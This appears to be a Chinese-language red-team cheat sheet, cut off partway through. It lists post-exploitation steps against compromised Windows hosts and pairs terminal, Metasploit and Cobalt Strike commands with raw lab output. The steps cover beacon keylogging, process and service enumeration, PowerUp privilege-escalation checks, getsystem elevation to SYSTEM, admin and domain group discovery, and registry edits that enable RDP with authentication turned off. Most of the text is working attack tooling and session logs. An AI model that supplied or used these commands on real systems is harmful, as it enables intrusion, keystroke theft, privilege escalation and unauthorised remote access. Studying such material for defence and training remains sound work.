[*] Tasked beacon to log keystrokes in 1200 (x86)
[+] host called home, sent: 65610 bytes
[-] could not open process 1200: 5
[-] Could not connect to pipe: 2
[+] received keystrokes
[+] received keystrokes
beacon> keylogger 1328 null
[*] Tasked beacon to log keystrokes in 1328 (null)
[+] host called home, sent: 65610 bytes
[-] could not open process 1328: 5
[-] Could not connect to pipe: 2
[+] received keystrokes

```

## Process Discovery(进程获取)

### Enumerate running processes（枚举运行的进程）

#### terminal下操作：

> tasklist /v [/svc]

> net start

> qprocess *

```shell
PS C:\Users\Administrator\Desktop\powrshell> tasklist /svc

映像名称                       PID 服务
========================= ======== ============================================
System Idle Process              0 暂缺
System                           4 暂缺
Registry                        88 暂缺
smss.exe                       296 暂缺
csrss.exe                      396 暂缺
wininit.exe                    496 暂缺
csrss.exe                      508 暂缺
winlogon.exe                   588 暂缺
services.exe                   604 暂缺
lsass.exe                      632 KeyIso, SamSs
svchost.exe                    732 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                744 暂缺
fontdrvhost.exe                812 暂缺
svchost.exe                    860 RpcEptMapper, RpcSs
svchost.exe                    904 LSM
dwm.exe                       1000 暂缺
svchost.exe                    376 TermService
svchost.exe                    656 CoreMessagingRegistrar
svchost.exe                    808 lmhosts
svchost.exe                   1120 NcbService
svchost.exe                   1136 Schedule
svchost.exe                   1176 ProfSvc
svchost.exe                   1248 EventLog
svchost.exe                   1300 UserManager
svchost.exe                   1332 nsi
svchost.exe                   1348 UmRdpService
svchost.exe                   1420 TimeBrokerSvc
svchost.exe                   1444 Dhcp
svchost.exe                   1512 CertPropSvc
svchost.exe                   1548 EventSystem
svchost.exe                   1580 SysMain
svchost.exe                   1616 Themes
Memory Compression            1716 暂缺
WUDFHost.exe                  1736 暂缺
svchost.exe                   1792 LanmanWorkstation
svchost.exe                   1812 SENS
svchost.exe                   1844 NlaSvc
svchost.exe                   1892 AudioEndpointBuilder
svchost.exe                   1916 FontCache
svchost.exe                   2028 SessionEnv
svchost.exe                   2036 Audiosrv
svchost.exe                   2064 netprofm
svchost.exe                   2204 Dnscache
svchost.exe                   2220 DusmSvc
svchost.exe                   2240 Wcmsvc
svchost.exe                   2276 StateRepository
svchost.exe                   2504 WlanSvc
svchost.exe                   2544 ShellHWDetection
spoolsv.exe                   2612 Spooler
svchost.exe                   2648 BFE, mpssvc
svchost.exe                   2772 IKEEXT
svchost.exe                   2784 PolicyAgent
wvs_supervisor.exe            2844 Acunetix
pg_ctl.exe                    2852 Acunetix Database
svchost.exe                   2860 CryptSvc
svchost.exe                   2884 DPS
FNPLicensingService.exe       2900 FlexNet Licensing Service
svchost.exe                   2928 Winmgmt
svchost.exe                   2988 LPDSVC
svchost.exe                   3016 LanmanServer
svchost.exe                   1656 SstpSvc
vmtoolsd.exe                  2364 VMTools
svchost.exe                   2312 TrkWks
sv_service.exe                 236 VOneMgrSvcForNG
svchost.exe                   2740 WpnService
svchost.exe                   3236 WdiServiceHost
svchost.exe                   3260 iphlpsvc
opsrv.exe                     3416 暂缺
svchost.exe                   3448 RasMan
postgres.exe                  3456 暂缺
conhost.exe                   3464 暂缺
conhost.exe                   3516 暂缺
dllhost.exe                   3976 COMSysApp
postgres.exe                   644 暂缺
postgres.exe                  2892 暂缺
postgres.exe                   660 暂缺
postgres.exe                  2920 暂缺
postgres.exe                  2880 暂缺
msdtc.exe                     4256 MSDTC
svchost.exe                   4972 CDPUserSvc_56a0b
sihost.exe                    4988 暂缺
svchost.exe                   5012 WpnUserService_56a0b
taskhostw.exe                 5088 暂缺
svchost.exe                   5116 TokenBroker
svchost.exe                   4452 TabletInputService
svchost.exe                     64 CDPSvc
ctfmon.exe                    4732 暂缺
svchost.exe                   1904 PcaSvc
explorer.exe                  5188 暂缺
svchost.exe                   5616 cbdhsvc_56a0b
sv_websvr.exe                 5712 暂缺
ShellExperienceHost.exe       5844 暂缺
RuntimeBroker.exe             6016 暂缺
WindowsInternal.Composabl     5184 暂缺
vmtoolsd.exe                  4816 暂缺
jusched.exe                    328 暂缺
AttackView.exe                5992 暂缺
svchost.exe                   2268 SSDPSRV
powershell.exe                1272 暂缺
conhost.exe                   3816 暂缺
svchost.exe                   4400 LicenseManager
svchost.exe                   4548 DsSvc
svchost.exe                   2228 StorSvc
WmiPrvSE.exe                  3944 暂缺
postgres.exe                  1364 暂缺
postgres.exe                  4520 暂缺
postgres.exe                  4488 暂缺
postgres.exe                  3392 暂缺
svchost.exe                   2212 BITS
svchost.exe                   4656 WinHttpAutoProxySvc
WmiPrvSE.exe                  6588 暂缺
tasklist.exe                  6920 暂缺

PS C:\Users\Administrator\Desktop\powrshell> net start
已经启动以下 Windows 服务:

   Acunetix
   Acunetix Database
   Background Tasks Infrastructure Service
   Base Filtering Engine
   Certificate Propagation
   CNG Key Isolation
   COM+ Event System
   COM+ System Application
   CoreMessaging
   Cryptographic Services
   Data Sharing Service
   DCOM Server Process Launcher
   DHCP Client
   Diagnostic Policy Service
   Diagnostic Service Host
   Distributed Link Tracking Client
   Distributed Transaction Coordinator
   DNS Client
   FlexNet Licensing Service
   IKE and AuthIP IPsec Keying Modules
   IP Helper
   IPsec Policy Agent
   Local Session Manager
   LPD Service
   Network Connection Broker
   Network List Service
   Network Location Awareness
   Network Store Interface Service
   Power
   Print Spooler
   Program Compatibility Assistant Service
   Remote Access Connection Manager
   Remote Desktop Configuration
   Remote Desktop Services
   Remote Desktop Services UserMode Port Redirector
   Remote Procedure Call (RPC)
   RPC Endpoint Mapper
   Secure Socket Tunneling Protocol Service
   Security Accounts Manager
   Server
   Shell Hardware Detection
   SSDP Discovery
   SSL VPN Management Service Program For NG
   State Repository Service
   Storage Service
   SysMain
   System Event Notification Service
   System Events Broker
   Task Scheduler
   TCP/IP NetBIOS Helper
   Themes
   Time Broker
   Touch Keyboard and Handwriting Panel Service
   User Manager
   User Profile Service
   VMware Tools
   Web 帐户管理器
   Windows Audio
   Windows Audio Endpoint Builder
   Windows Connection Manager
   Windows Defender Firewall
   Windows Event Log
   Windows Font Cache Service
   Windows Management Instrumentation
   Windows Push Notifications User Service_56a0b
   Windows 推送通知系统服务
   Windows 许可证管理器服务
   WinHTTP Web Proxy Auto-Discovery Service
   WLAN AutoConfig
   Workstation
   剪贴板用户服务_56a0b
   数据使用量
   连接设备平台服务
   连接设备平台用户服务_56a0b

命令成功完成。


PS C:\Users\Administrator\Desktop\powrshell> qprocess *
 用户名                会话名              ID    PID  映像
 (未知)                services             0      0
 (未知)                services             0      4  system
 system                services             0     88  registry
 system                services             0    296  smss.exe
 system                services             0    396  csrss.exe
 system                services             0    496  wininit.exe
>system                console              1    508  csrss.exe
>system                console              1    588  winlogon.exe
 system                services             0    604  services.exe
 system                services             0    632  lsass.exe
 system                services             0    732  svchost.exe
 umfd-0                services             0    744  fontdrvhost.ex
>umfd-1                console              1    812  fontdrvhost.ex
 network service       services             0    860  svchost.exe
 system                services             0    904  svchost.exe
>dwm-1                 console              1   1000  dwm.exe
 network service       services             0    376  svchost.exe
 local service         services             0    656  svchost.exe
 local service         services             0    808  svchost.exe
 system                services             0   1120  svchost.exe
 system                services             0   1136  svchost.exe
 system                services             0   1176  svchost.exe
 local service         services             0   1248  svchost.exe
 system                services             0   1300  svchost.exe
 local service         services             0   1332  svchost.exe
 system                services             0   1348  svchost.exe
 local service         services             0   1420  svchost.exe
 local service         services             0   1444  svchost.exe
 system                services             0   1512  svchost.exe
 local service         services             0   1548  svchost.exe
 system                services             0   1580  svchost.exe
 system                services             0   1616  svchost.exe
 system                services             0   1716  memory compr..
 local service         services             0   1736  wudfhost.exe
 network service       services             0   1792  svchost.exe
 system                services             0   1812  svchost.exe
 network service       services             0   1844  svchost.exe
 system                services             0   1892  svchost.exe
 local service         services             0   1916  svchost.exe
 system                services             0   2028  svchost.exe
 local service         services             0   2036  svchost.exe
 local service         services             0   2064  svchost.exe
 network service       services             0   2204  svchost.exe
 local service         services             0   2220  svchost.exe
 local service         services             0   2240  svchost.exe
 system                services             0   2276  svchost.exe
 system                services             0   2504  svchost.exe
 system                services             0   2544  svchost.exe
 system                services             0   2612  spoolsv.exe
 local service         services             0   2648  svchost.exe
 system                services             0   2772  svchost.exe
 network service       services             0   2784  svchost.exe
 system                services             0   2844  wvs_supervis..
 local service         services             0   2852  pg_ctl.exe
 network service       services             0   2860  svchost.exe
 local service         services             0   2884  svchost.exe
 system                services             0   2900  fnplicensing..
 system                services             0   2928  svchost.exe
 system                services             0   2988  svchost.exe
 system                services             0   3016  svchost.exe
 local service         services             0   1656  svchost.exe
 system                services             0   2364  vmtoolsd.exe
 system                services             0   2312  svchost.exe
 system                services             0    236  sv_service.exe
 system                services             0   2740  svchost.exe
 local service         services             0   3236  svchost.exe
 system                services             0   3260  svchost.exe
 system                services             0   3416  opsrv.exe
 system                services             0   3448  svchost.exe
 local service         services             0   3456  postgres.exe
 system                services             0   3464  conhost.exe
 local service         services             0   3516  conhost.exe
 system                services             0   3976  dllhost.exe
 local service         services             0    644  postgres.exe
 local service         services             0   2892  postgres.exe
 local service         services             0    660  postgres.exe
 local service         services             0   2920  postgres.exe
 local service         services             0   2880  postgres.exe
 network service       services             0   4256  msdtc.exe
>administrator         console              1   4972  svchost.exe
>administrator         console              1   4988  sihost.exe
>administrator         console              1   5012  svchost.exe
>administrator         console              1   5088  taskhostw.exe
 system                services             0   5116  svchost.exe
 system                services             0   4452  svchost.exe
 local service         services             0     64  svchost.exe
>administrator         console              1   4732  ctfmon.exe
 system                services             0   1904  svchost.exe
>administrator         console              1   5188  explorer.exe
>administrator         console              1   5616  svchost.exe
>administrator         console              1   5712  sv_websvr.exe
>administrator         console              1   5844  shellexperie..
>administrator         console              1   6016  runtimebroke..
>administrator         console              1   5184  windowsinter..
>administrator         console              1   4816  vmtoolsd.exe
>administrator         console              1   5992  attackview.exe
 local service         services             0   2268  svchost.exe
>administrator         console              1   1272  powershell.exe
>administrator         console              1   3816  conhost.exe
 local service         services             0   4400  svchost.exe
 system                services             0   4548  svchost.exe
 system                services             0   2228  svchost.exe
 system                services             0   3944  wmiprvse.exe
 local service         services             0   1364  postgres.exe
 local service         services             0   4520  postgres.exe
 local service         services             0   4488  postgres.exe
 local service         services             0   3392  postgres.exe
 local service         services             0   4656  svchost.exe
 network service       services             0   6588  wmiprvse.exe
 local service         services             0   2528  audiodg.exe
>administrator         console              1    260  qprocess.exe
```

#### msf下操作：

> ps
>
> post/windows/gather/enum_services

```
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User                           Path
 ---   ----  ----                     ----  -------  ----                           ----
 0     0     [System Process]                                                       
 4     0     System                   x86   0                                       
 264   4     smss.exe                 x86   0        NT AUTHORITY\SYSTEM            \SystemRoot\System32\smss.exe
 312   264   csrss.exe                x86   0        NT AUTHORITY\SYSTEM            \??\C:\WINDOWS\system32\csrss.exe
 340   264   winlogon.exe             x86   0        NT AUTHORITY\SYSTEM            \??\C:\WINDOWS\system32\winlogon.exe
 388   340   services.exe             x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\services.exe
 400   340   lsass.exe                x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\lsass.exe
 572   1436  payload1.exe             x86   0        ROOT-5DE52AC98B\Administrator  C:\Documents and Settings\Administrator\����\payload1.exe
 592   388   vmacthlp.exe             x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\vmacthlp.exe
 608   388   svchost.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\svchost.exe
 688   388   svchost.exe              x86   0                                       C:\WINDOWS\system32\svchost.exe
 748   388   svchost.exe              x86   0                                       C:\WINDOWS\system32\svchost.exe
 800   388   svchost.exe              x86   0                                       C:\WINDOWS\system32\svchost.exe
 816   388   svchost.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\System32\svchost.exe
 912   3424  TPAutoConnect.exe        x86   0        ROOT-5DE52AC98B\Administrator  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 956   388   spoolsv.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\spoolsv.exe
 984   388   msdtc.exe                x86   0                                       C:\WINDOWS\system32\msdtc.exe
 1100  388   httpd.exe                x86   0        NT AUTHORITY\SYSTEM            C:\phpStudy\PHPTutorial\Apache\bin\httpd.exe
 1144  388   svchost.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\System32\svchost.exe
 1200  388   inetinfo.exe             x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\inetsrv\inetinfo.exe
 1228  388   mysqld.exe               x86   0        NT AUTHORITY\SYSTEM            C:\phpStudy\PHPTutorial\MySQL\bin\mysqld.exe
 1252  388   mysqld.exe               x86   0        NT AUTHORITY\SYSTEM            C:\phpStudy\PHPTutorial\MySQL\bin\mysqld.exe
 1320  168   conime.exe               x86   0        ROOT-5DE52AC98B\Administrator  C:\WINDOWS\system32\conime.exe
 1328  388   svchost.exe              x86   0                                       C:\WINDOWS\system32\svchost.exe
 1348  3424  TPAutoConnect.exe        x86   0        ROOT-5DE52AC98B\Administrator  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 1352  388   SafeDogUpdateCenter.exe  x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\SafeDog\SafeDogUpdateCenter\SafeDogUpdateCenter.exe
 1436  1168  explorer.exe             x86   0        ROOT-5DE52AC98B\Administrator  C:\WINDOWS\Explorer.EXE
 1440  388   CloudHelper.exe          x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\SafeDog\SafeDogUpdateCenter\CloudHelper.exe
 1468  1436  ctfmon.exe               x86   0        ROOT-5DE52AC98B\Administrator  C:\WINDOWS\system32\ctfmon.exe
 1804  388   VGAuthService.exe        x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1856  388   vmtoolsd.exe             x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1932  388   mqsvc.exe                x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\mqsvc.exe
 2072  388   svchost.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\System32\svchost.exe
 2248  1100  httpd.exe                x86   0        NT AUTHORITY\SYSTEM            C:\phpStudy\PHPTutorial\Apache\bin\httpd.exe
 2264  1436  vmtoolsd.exe             x86   0        ROOT-5DE52AC98B\Administrator  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2904  608   wmiprvse.exe             x86   0                                       C:\WINDOWS\system32\wbem\wmiprvse.exe
 3196  608   wmiprvse.exe             x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\wbem\wmiprvse.exe
 3368  388   svchost.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\System32\svchost.exe
 3408  1436  artifact.exe             x86   0        ROOT-5DE52AC98B\Administrator  C:\Documents and Settings\Administrator\����\artifact.exe
 3424  388   TPAutoConnSvc.exe        x86   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
 3520  388   dllhost.exe              x86   0        NT AUTHORITY\SYSTEM            C:\WINDOWS\system32\dllhost.exe
 3600  1436  artifact.exe             x86   0        ROOT-5DE52AC98B\Administrator  C:\Documents and Settings\Administrator\����\artifact.exe
 3876  340   logon.scr                x86   0        ROOT-5DE52AC98B\Administrator  C:\WINDOWS\System32\logon.scr

msf5 post(windows/gather/enum_logged_on_users) > use post/windows/gather/enum_services 
msf5 post(windows/gather/enum_services) > set session 1
session => 1
msf5 post(windows/gather/enum_services) > exploit 

[*] Listing Service Info for matching services, please wait...
[+] New service credential detected: AeLookupSvc is running as 'LocalSystem'
[+] New service credential detected: Alerter is running as 'NT AUTHORITY\LocalService'
[+] New service credential detected: aspnet_state is running as 'NT AUTHORITY\NetworkService'
Services
========

 Name                                 Credentials                  Command   Startup
 ----                                 -----------                  -------   -------
 ALG                                  NT AUTHORITY\LocalService    Manual    C:\WINDOWS\System32\alg.exe
 AeLookupSvc                          LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 Alerter                              NT AUTHORITY\LocalService    Disabled  C:\WINDOWS\system32\svchost.exe -k LocalService
 Apache2                              LocalSystem                  Auto      "C:\phpstudy0\Apache\bin\httpd.exe" -k runservice
 AppMgmt                              LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 AudioSrv                             LocalSystem                  Disabled  C:\WINDOWS\System32\svchost.exe -k netsvcs
 BITS                                 LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 Browser                              LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 COMSysApp                            LocalSystem                  Manual    C:\WINDOWS\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
 CiSvc                                LocalSystem                  Disabled  C:\WINDOWS\system32\cisvc.exe
 ClipSrv                              LocalSystem                  Disabled  C:\WINDOWS\system32\clipsrv.exe
 CryptSvc                             LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 DcomLaunch                           LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k DcomLaunch
 Dfs                                  LocalSystem                  Manual    C:\WINDOWS\system32\Dfssvc.exe
 Dhcp                                 NT AUTHORITY\NetworkService  Auto      C:\WINDOWS\system32\svchost.exe -k NetworkService
 Dnscache                             NT AUTHORITY\NetworkService  Auto      C:\WINDOWS\system32\svchost.exe -k NetworkService
 ERSvc                                LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k WinErr
 EventSystem                          LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 Eventlog                             LocalSystem                  Auto      C:\WINDOWS\system32\services.exe
 HTTPFilter                           LocalSystem                  Manual    C:\WINDOWS\system32\lsass.exe
 HidServ                              LocalSystem                  Disabled  C:\WINDOWS\System32\svchost.exe -k netsvcs
 IISADMIN                             LocalSystem                  Auto      C:\WINDOWS\system32\inetsrv\inetinfo.exe
 ImapiService                         LocalSystem                  Disabled  C:\WINDOWS\system32\imapi.exe
 IsmServ                              LocalSystem                  Disabled  C:\WINDOWS\System32\ismserv.exe
 LicenseService                       NT AUTHORITY\NetworkService  Disabled  C:\WINDOWS\System32\llssrv.exe
 LmHosts                              NT AUTHORITY\LocalService    Auto      C:\WINDOWS\system32\svchost.exe -k LocalService
 MSDTC                                NT AUTHORITY\NetworkService  Auto      C:\WINDOWS\system32\msdtc.exe
 MSIServer                            LocalSystem                  Manual    C:\WINDOWS\system32\msiexec.exe /V
 MSMQ                                 LocalSystem                  Auto      C:\WINDOWS\system32\mqsvc.exe
 Messenger                            LocalSystem                  Disabled  C:\WINDOWS\system32\svchost.exe -k netsvcs
 MySQL                                LocalSystem                  Auto      C:\phpStudy\PHPTutorial\MySQL\bin\mysqld.exe MySQL
 MySQLa                               LocalSystem                  Auto      C:\phpStudy\PHPTutorial\MySQL\bin\mysqld.exe MySQLa
 NetDDE                               LocalSystem                  Disabled  C:\WINDOWS\system32\netdde.exe
 NetDDEdsdm                           LocalSystem                  Disabled  C:\WINDOWS\system32\netdde.exe
 Netlogon                             LocalSystem                  Manual    C:\WINDOWS\system32\lsass.exe
 Netman                               LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k netsvcs
 Nla                                  LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 NtFrs                                LocalSystem                  Manual    C:\WINDOWS\system32\ntfrs.exe
 NtLmSsp                              LocalSystem                  Manual    C:\WINDOWS\system32\lsass.exe
 NtmsSvc                              LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 PlugPlay                             LocalSystem                  Auto      C:\WINDOWS\system32\services.exe
 PolicyAgent                          LocalSystem                  Auto      C:\WINDOWS\system32\lsass.exe
 ProtectedStorage                     LocalSystem                  Auto      C:\WINDOWS\system32\lsass.exe
 RDSessMgr                            LocalSystem                  Manual    C:\WINDOWS\system32\sessmgr.exe
 RSoPProv                             LocalSystem                  Manual    C:\WINDOWS\system32\RSoPProv.exe
 RasAuto                              LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 RasMan                               LocalSystem                  Manual    C:\WINDOWS\system32\svchost.exe -k netsvcs
 RemoteAccess                         LocalSystem                  Disabled  C:\WINDOWS\system32\svchost.exe -k netsvcs
 RemoteRegistry                       NT AUTHORITY\LocalService    Auto      C:\WINDOWS\system32\svchost.exe -k regsvc
 RpcLocator                           NT AUTHORITY\NetworkService  Manual    C:\WINDOWS\system32\locator.exe
 RpcSs                                NT AUTHORITY\NetworkService  Auto      C:\WINDOWS\system32\svchost.exe -k rpcss
 SCardSvr                             NT AUTHORITY\LocalService    Manual    C:\WINDOWS\System32\SCardSvr.exe
 SENS                                 LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 SafeDogCloudHelper                   LocalSystem                  Auto      "C:\Program Files\SafeDog\SafeDogUpdateCenter\CloudHelper.exe"
 Safedog Update Center                LocalSystem                  Auto      "C:\Program Files\SafeDog\SafeDogUpdateCenter\SafeDogUpdateCenter.exe"
 SamSs                                LocalSystem                  Auto      C:\WINDOWS\system32\lsass.exe
 Schedule                             LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 SharedAccess                         LocalSystem                  Disabled  C:\WINDOWS\system32\svchost.exe -k netsvcs
 ShellHWDetection                     LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 Spooler                              LocalSystem                  Auto      C:\WINDOWS\system32\spoolsv.exe
 SysmonLog                            NT Authority\NetworkService  Auto      C:\WINDOWS\system32\smlogsvc.exe
 TPAutoConnSvc                        LocalSystem                  Manual    "C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe"
 TPVCGateway                          LocalSystem                  Manual    "C:\Program Files\VMware\VMware Tools\TPVCGateway.exe"
 TapiSrv                              LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k tapisrv
 TermService                          LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k termsvcs
 Themes                               LocalSystem                  Disabled  C:\WINDOWS\System32\svchost.exe -k netsvcs
 TlntSvr                              NT AUTHORITY\LocalService    Disabled  C:\WINDOWS\system32\tlntsvr.exe
 TrkSvr                               LocalSystem                  Disabled  C:\WINDOWS\system32\svchost.exe -k netsvcs
 TrkWks                               LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 Tssdis                               LocalSystem                  Disabled  C:\WINDOWS\System32\tssdis.exe
 UMWdf                                NT AUTHORITY\LocalService    Manual    C:\WINDOWS\system32\wdfmgr.exe
 UPS                                  NT AUTHORITY\LocalService    Manual    C:\WINDOWS\System32\ups.exe
 VGAuthService                        LocalSystem                  Auto      "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
 VMTools                              LocalSystem                  Auto      "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
 VMware Physical Disk Helper Service  LocalSystem                  Auto      "C:\Program Files\VMware\VMware Tools\vmacthlp.exe"
 VSS                                  LocalSystem                  Manual    C:\WINDOWS\System32\vssvc.exe
 W32Time                              NT AUTHORITY\LocalService    Auto      C:\WINDOWS\System32\svchost.exe -k LocalService
 W3SVC                                LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k iissvcs
 WZCSVC                               LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 WebClient                            NT AUTHORITY\LocalService    Disabled  C:\WINDOWS\system32\svchost.exe -k LocalService
 WinHttpAutoProxySvc                  NT AUTHORITY\LocalService    Manual    C:\WINDOWS\system32\svchost.exe -k LocalService
 WmdmPmSN                             LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k netsvcs
 Wmi                                  LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k netsvcs
 WmiApSrv                             LocalSystem                  Manual    C:\WINDOWS\system32\wbem\wmiapsrv.exe
 apache                               LocalSystem                  Auto      "C:\phpStudy\PHPTutorial\Apache\bin\httpd.exe" -k runservice
 aspnet_state                         NT AUTHORITY\NetworkService  Manual    C:\WINDOWS\Microsoft.NET\Framework\v1.1.4322\aspnet_state.exe
 dmadmin                              LocalSystem                  Manual    C:\WINDOWS\System32\dmadmin.exe /com
 dmserver                             LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 helpsvc                              LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 kdc                                  LocalSystem                  Disabled  C:\WINDOWS\System32\lsass.exe
 lanmanserver                         LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 lanmanworkstation                    LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 mnmsrvc                              LocalSystem                  Disabled  C:\WINDOWS\system32\mnmsrvc.exe
 sacsvr                               LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k netsvcs
 seclogon                             LocalSystem                  Auto      C:\WINDOWS\System32\svchost.exe -k netsvcs
 stisvc                               NT AUTHORITY\LocalService    Disabled  C:\WINDOWS\system32\svchost.exe -k imgsvc
 swprv                                LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k swprv
 vds                                  LocalSystem                  Manual    C:\WINDOWS\System32\vds.exe
 vmvss                                LocalSystem                  Manual    C:\WINDOWS\system32\dllhost.exe /Processid:{64F3ADCF-113F-4FD8-B7EE-76884E9E75E6}
 winmgmt                              LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 wuauserv                             LocalSystem                  Auto      C:\WINDOWS\system32\svchost.exe -k netsvcs
 xmlprov                              LocalSystem                  Manual    C:\WINDOWS\System32\svchost.exe -k netsvcs

[+] Loot file stored in: /root/.msf4/loot/20190907144835_default_192.168.2.114_windows.services_639665.txt
[*] Post module execution completed

```

#### cs下操作：

> explore  -- >  process list

![截图_2019-09-07_14-53-28.png](http://ww1.sinaimg.cn/large/007F8GgBly1g6qyjl72ovj30ow08zzkl.jpg)

## Service Registry Permissions Weakness(注册权限不足)

### Check for common privilege escalation methods

#### termianal下操作：

> powershell.exe -epbypass PowerUp.ps1
>
> Invoke-AllChecks

#### msf下操作：

> exploit/windows/local/trusted_service_path

#### cs下操作：

> powershell-import /path/to/PowerUp.ps1
>
> powershell Invoke-AllChecks

## Exploitation for Privilege Escalation(利用漏洞提权)

### Elevate to SYSTEM level process（提权至system）

#### msf下操作：

> getsystem


getsystem工作原理：

- ①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。
- ②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。
- ③Windows服务已启动，导致与命名管道建立连接。
- ④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。

然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程

有三种工作方式

    0 : All techniques available
		1 : Named Pipe Impersonation (In Memory/Admin)1:命名管道模拟(在内存/管理中)
		2 : Named Pipe Impersonation (Dropper/Admin)2:命名管道模拟(Dropper/Admin)
		3 : Token Duplication (In Memory/Admin)3:令牌复制(在内存/管理中)
		


```
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```
#### cs下操作：

> getsystem

```
beacon> getsystem
[*] Tasked beacon to get SYSTEM
[+] host called home, sent: 100 bytes
[+] Impersonated NT AUTHORITY\SYSTEM
```
## Permission Groups Discovery（权限组发现）

### Enumerate local Admin accounts（本地账户枚举）

#### terminal下操作：

> net localgroup "Administrators"

```shell
PS C:\Users\Administrator\Desktop\powrshell> net localgroup "Administrators"
别名     Administrators
注释     管理员对计算机/域有不受限制的完全访问权

成员

-------------------------------------------------------------------------------
Administrator
命令成功完成。

```

#### msf下操作：

> post/windows/gather/local_admin_search_enum

```
msf5 post(windows/gather/local_admin_search_enum) > exploit 

[-] Running as SYSTEM, module should be run with USER level rights
[*] Scanned 1 of 1 hosts (100% complete)
[*] Post module execution completed

```

#### cs下操作：

> shell net localgroup "Administrators"

```shell

beacon> shell net localgroup "Administrators"
[*] Tasked beacon to run: net localgroup "Administrators"
[+] host called home, sent: 62 bytes
[-] could not spawn C:\WINDOWS\system32\cmd.exe /C net localgroup "Administrators" (token): 1349

```

### Get domain admin accounts(域管理账户枚举)

#### terminal下操作：

> net group ["Domain Admins"] /domain[:DOMAIN]

```shell
PS C:\Users\Administrator\Desktop\powrshell> net group /domain
这项请求将在域 WORKGROUP 的域控制器处理。

发生系统错误 1355。

指定的域不存在，或无法联系。

```
#### msf下操作：

> post/windows/gather/enum_domain_group_users

```shell
msf5 post(windows/gather/enum_domain_group_users) > exploit 

[*] Running module against ROOT-5DE52AC98B
[-] Post failed: NoMethodError undefined method `each' for nil:NilClass
[-] Call stack:
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_domain_group_users.rb:77:in `get_members'
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_domain_group_users.rb:42:in `run'
[*] Post module execution completed


```

#### cs下操作：

> net group ["Domain Admins"] /domain

## Remote Desktop Protocol

### Enable RDP Services(开启RDP服务)

#### terminal下操作：

```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 

